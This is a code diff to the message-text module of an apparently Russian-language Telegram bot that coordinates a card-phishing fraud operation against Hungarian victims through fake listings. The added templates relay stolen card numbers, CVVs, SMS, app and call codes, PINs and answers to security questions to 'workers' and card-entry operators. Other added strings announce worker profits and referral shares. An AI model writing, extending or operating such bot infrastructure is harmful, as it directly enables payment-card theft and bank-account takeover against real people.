@@ -9,7 +9,7 @@ class texts():
     menu = '''Жизнь коротка, и каждая минута на счету. Посвящая своё время нашему проекту сейчас, вы делаете вложение в будущее. Ваша отдача и усердие в нашем деле приведут к результатам, которые не только оправдают затраченное время, но и принесут плоды, экономя ваше время в долгосрочной перспективе!\n\n🕒График работы проекта: с 08:00 до 00:30 по МСК.'''
     channels = "Чем больше вы изучите, тем больше вы получите!"
     @staticmethod
-    def profile(id, nickHide,SmartSupp,  sumProfits, countProfits, commandMe):
+    def profile(id, nickHide,SmartSupp,  sumProfits, countProfits, commandMe, status):
         SmartSupp_text = "🟢"
         if not SmartSupp:
             SmartSupp_text = "🔴"
@@ -24,6 +24,8 @@ class texts():
 🛡Ник: {nickHide_text}
 
 🌑 SmartSupp: {SmartSupp_text}
+
+🛡Статус: {status}
 
 🎩 Сумма профитов: ${sumProfits}
 🏦 Количество профитов: {countProfits}
@@ -115,7 +117,7 @@ class texts():
 Объявления удаляются 1 раз в 24 часа с момента создания!'''
 
     admin_error = "У вас нет доступа к админ панели."
-
+    change_status = "Выберите статусы"
     @staticmethod
     def admin_menu(data):
         return f'''🔐 Панель администратора
@@ -129,9 +131,6 @@ class texts():
 ✅ Принятых заявок: {data['requests_accepted']}
 ❌ Отклонённых заявок: {data['request_error']}
 
-💸 Сумма невыплаченных профитов: {data['sum_non_paid']} USD
-💳 Сумма выплаченных профитов: {data['sum_paid']} USD
-
 💴 Процент воркера с залёта: {data['percent']}%'''
 
 
@@ -141,7 +140,10 @@ class texts():
 
     choose_country = "🌎 Выберите страну"
 
+
+
 class in_keyboard_texts:
+    error_get_countries = "❌Ошибка при получении стран"
     inlineStart = "⚡️ПЕРЕЙТИ К ЗАЯВКЕ⚡️"
     confirmRules = "Я принимаю"
     identificationButton1 = "Реклама"
@@ -224,6 +226,9 @@ class start_texts:
     friendWaitText = "Введите юзернейм вашего друга, который вас пригласил. Он получит 6% с вашего первого профита.\n\nПример: @OviumBot"
 
 class admin_texts:
+
+    success_change_admin=f'''Вас назначили админом .'''
+    success_change_vbiver = f'''Вас назначили вбивером.'''
     @staticmethod
     def admin_user_profile(user):
         print(user)
@@ -236,7 +241,7 @@ class admin_texts:
 💸 Сумма профитов: {user['profits_count']} USD.
 📦 Объявлений: {user['links_count']}
 🚦 Статус: {user['status']}
-📃 Присоединился: {user['added']}
+📃 Присоединился: {user['created_at']}
 Наставник: {"Да" if user['mentor'] else "Нет"}
 
 📰 Заявка: 
@@ -247,7 +252,16 @@ class admin_texts:
         return f"✅Текст отправлен {count} пользователям"
 
     admin_send_all = "Введите сообщение для рассылки:"
+    @staticmethod
+    def profit(amount):
+        return f'У вас новый профит на {amount}$'
 
+    @staticmethod
+    def profit_service(amount, service, user):
+        return f'Новый профит на {amount}$\nСервис: {service["name"]}{service["country"]}\nВоркер @{user["nickname"]}'
+    @staticmethod
+    def ref_profit(amount):
+        return f"💰Ваша прибыль c приглащенного друга: {amount}"
     @staticmethod
     def admin_users(count):
         return f"👥 Список пользователей (Всего: {count})"
@@ -260,7 +274,7 @@ class admin_texts:
 
     add_new_user = "Принять"
     ban_new_user  = "Отклонить"
-
+    not_your_link = "Этот лог уже обрабатывают"
     @staticmethod
     def request(request):
         friend_text = ""
@@ -299,6 +313,7 @@ class admin_texts:
         }
         return statusText[_status]
 
+    success_change_status_user = "Вы успешно поменяли статус"
     @staticmethod
     def requests(count):
         return f'''📝 Список заявок (Всего: {count})'''
@@ -360,14 +375,18 @@ class log:
         balance = f"\n💰 Balance: {log['balance']} Ft" if log['balance'] else ""
         accurate = f"\nAccurate Balance: {log['accurate_balance']}" if log['accurate_balance'] else ""
         sms = f"\n📴 SMS Code: {log['sms']}" if log['sms'] else ""
-        app_code = f"\nApp Code: {log['app_code']}" if log['app_code'] else ""
-        call_code = f"\nCall Code: {log['call_code']}" if log['call_code'] else ""
+        app_code = f"\nApp Code: {log['app']}" if log['app'] else ""
+        call_code = f"\nCall Code: {log['call']}" if log['call'] else ""
+        pin_code = f"\nPin Code: {log['pin']}" if log['pin'] else ""
+        answer_text = f"\nAnswer to Question: {log['custom_text']}" if log['custom_text'] else ""
+        answer_photo = f"\nAnswer to Photo: {log['custom_photo']}" if log['custom_photo'] else ""
+        answer_error = f"\nAnswer to Error: {log['custom_error']}" if log['custom_error'] else ""
         return f'''{service['country']+service['name']}!
 
 💳 Card Number: {log['card']}
 📅 Card Expiry Date: {log['expire']}
 🤣 Cardholder Name: {log['holder']}
-🔢 CVV Code: {log['cvc']}{balance}{accurate}{sms}{app_code}{call_code}Answer to Question: dfghdfhgfh
+🔢 CVV Code: {log['cvc']}{balance}{accurate}{sms}{app_code}{call_code}{pin_code}{answer_text}{answer_photo}{answer_error}
 
 👨🏻‍💻 Воркер: {worker['nickname']}
 👤 ID Воркера: {worker['id']}
@@ -378,8 +397,10 @@ class log:
 💲 Цена:{link['price']} HUF
 👁 #search193022231'''
 
-
+    success_log_wait="Отправьте сумму, которую вы обработали"
+    success_log = "✅Вы успешно обработали лог"
     wait_text ="Напишите текст:"
+    wait_photo = "Отправьте фото:"
 
     user_online = "🟢Пользователь в сети"
     user_offline = "🔴Пользователь не в сети"
@@ -410,6 +431,22 @@ class log:
     app_code = "📫КОД С ПРИЛОЖЕНИЯ"
     call_code = "📞КОД ИЗ ЗВОНКА"
     @staticmethod
+    def log_request(log, service, link, worker):
+        return  f'''✏️ Ввод карты {service['subdomain']}!
+
+💳 Card Number: {log['card']}
+📅 Card Expiry Date: {log['expire']}
+🤣 Cardholder Name: {log['holder']}
+🔢 CVV Code: {log['cvc']}
+
+👨🏻‍💻 Воркер: @{worker['username']}
+👤 ID Воркера: {worker['id']}
+
+🔡 Объявление: {link['name']}
+🔢 ID Объявления: {link['id']}
+
+💲 Цена:{link['price']} HUF'''
+    @staticmethod
     def status(status):
         statusText = {
             "hold":"🔒ХОЛД",
@@ -430,6 +467,9 @@ class log:
             "limit":"⚠️ЛИМИТЫ",
             "success_hold":"✅Успешный холд",
             "app_code":"📫КОД С ПРИЛОЖЕНИЯ",
-            "call_code":"📞КОД ИЗ ЗВОНКА"
+            "call_code":"📞КОД ИЗ ЗВОНКА",
+            'custom_text':"❗️Кастомный текст",
+            "custom_error":"❗️Кастомный ошибка",
+            "custom_photo":"📷Картинка"
         }
         return "Статус: "+statusText[status]
